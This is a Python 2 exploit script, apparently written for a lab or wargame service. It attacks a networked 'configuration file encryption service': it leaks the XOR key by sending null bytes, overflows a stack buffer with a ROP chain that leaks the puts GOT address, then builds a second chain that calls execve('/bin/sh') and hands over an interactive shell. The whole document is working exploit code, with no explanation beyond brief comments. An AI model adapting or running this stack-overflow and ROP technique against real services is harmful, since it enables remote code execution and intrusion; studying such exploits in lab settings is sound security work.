#!/usr/bin/python
import socket
import struct
import time
import telnetlib

# XOR Encryption
def crypt(value, key, key_sz=128):
	print "[+] Cipher Key Length  : ", len(key)
	print "[+] Cipher Data Length : ", len(value)
	return ''.join([chr(ord(value[x])^ord(key[x % key_sz])) for x in range(len(value))])


# Get banner 
def recv_banner(s, banner):
	return s.read(len(banner))

# send command
def send_cmd(s, cmd):
	s.write("E")
	s.write(struct.pack("I", len(cmd)))
	s.write(cmd)
	return

# Creating Socket Object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


s.connect(('192.168.56.101', 20002))


sock = s.makefile('rw', bufsize=0) # file descriptor 

# Recv Welcome Banner
recv_banner(sock, "[-- Enterprise configuration file encryption service --]\n")

# +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#                  Stage One Key Disclouser
# +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
# send NULL data
print "[+] Trying To Leak Encryption Key."
send_cmd(sock, "\x00"*128)
# Recv another banner
recv_banner(sock, "[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n")
# Recv Data 
keydata = recv_banner(sock, "A"*132)
print "[+] Extracting Cipher Key."
print "[+] Data Recv             : ", len(keydata)
print "[+] Key Length            : ", struct.unpack("I", keydata[:4])
key = keydata[4:]
if len(key)==128:
	print "[+] Key Disclouser stage Complete."
else:
	print "[+] key Disclouser Fail"
	exit(0)

# --------------------------------------------------------------
#                        Stage 2 Send Buffer
# -------------------------------------------------------------
#
# ROP Chain First Stage [Try To Disclouse lib Offset]
rop = ''
rop+= struct.pack("<I", 0x80495a0)  # nwrite(Arg1, Arg2, Arg3)
rop+= struct.pack("<I", 0x080497f7) # Next Pointer [Encrypt File]
rop+= struct.pack("<I", 1)          # arg1 = Stdout
rop+= struct.pack("<I", 0x0804b3b8) # arg2 = 0804b3b8 R_386_JUMP_SLOT   puts(Pointer To string)
rop+= struct.pack("<I", 4) # arg3 = Length

buff = 'YES'*4
buff+= 'A'*4096*32
buff+= 'EEEE'        # Base Pointer
buff+= rop        # Return Pointer
buff+= 'GGGG'
send_cmd(sock,crypt(buff, key))


# Banner Receive
recv_banner(sock, "[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n")

# Key Reply Recv
print "[+] Verifying Buffer Successfully Sent  : ", buff[:10]==recv_banner(sock, "A"*(len(buff)+4))[4:14]


#
print "[+] Trigger Victim Return Function Routine .", s.send("Q")




put_got_entry = struct.unpack("<I",s.recv(1024))[0]
print hex(put_got_entry) 
# ROP Chain Second Stage [Execute /bin/sh command]
rop = ''

# Address : Execve - Puts
execve = 0x355910 - 0x31a3b0
binsh =  0x3f28da - 0x31a3b0
# Address : Execve

# try To execute Execve("/bin/sh", NULL, NULL)
rop+= struct.pack("<I", execve + put_got_entry )  # Execve(Arg1, Arg2, Arg3)
rop+= struct.pack("<I", 0x080497f7) # Next Pointer [Encrypt File]
rop+= struct.pack("<I", binsh + put_got_entry)          # arg1 = "/bin/sh"
rop+= struct.pack("<I", 0) # arg2 = 0804b3b8 R_386_JUMP_SLO$
rop+= struct.pack("<I", 0) # arg3 = Length

buff = 'Hack'*3
buff+= 'A'*4096*32
buff+= 'EEEE'        # Base Pointer
buff+= rop        # Return Pointer
buff+= 'GGGG'
send_cmd(sock,crypt(buff, key))

recv_banner(sock, "[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n")
recv_banner(sock, "A"*(len(buff)+20))
sock.write('Q')
t = telnetlib.Telnet()
t.sock = s
t.interact()

# Close SOcket
s.close()

